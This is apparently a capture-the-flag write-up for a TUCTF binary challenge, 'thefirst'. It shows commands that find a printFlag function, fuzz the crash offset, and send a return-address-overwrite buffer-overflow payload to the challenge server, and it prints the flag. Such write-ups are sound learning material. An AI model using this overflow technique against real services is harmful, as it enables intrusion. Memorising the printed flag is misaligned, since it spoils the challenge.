#### Challenge:

Get warmed up, we'll be here for a while. [thefirst](./thefirst ":ignore")

`nc chal.tuctf.com 30508`

---

#### Solution:

- analyzed binary and located function that can be used to access flag `printFlag`

```bash
readelf -s ./thefirst | grep -i flag  # 51: 080491f6    41 FUNC    GLOBAL DEFAULT   15 printFlag
python -c 'print "A"*25' | ./thefirst # find the right offset
dmesg | tail # [106727.176378] thefirst[14603]: segfault at 0 ip 00000000f7560041 sp 00000000ff9d76c0
python -c 'import struct; print "A"*24 + struct.pack("<I",0x080491f6 )' | nc chal.tuctf.com 30508
```

---

<details><summary>FLAG:</summary>

```
TUCTF{0n3_d0wn..._50_m4ny_70_60}
```

</details>
<br/>
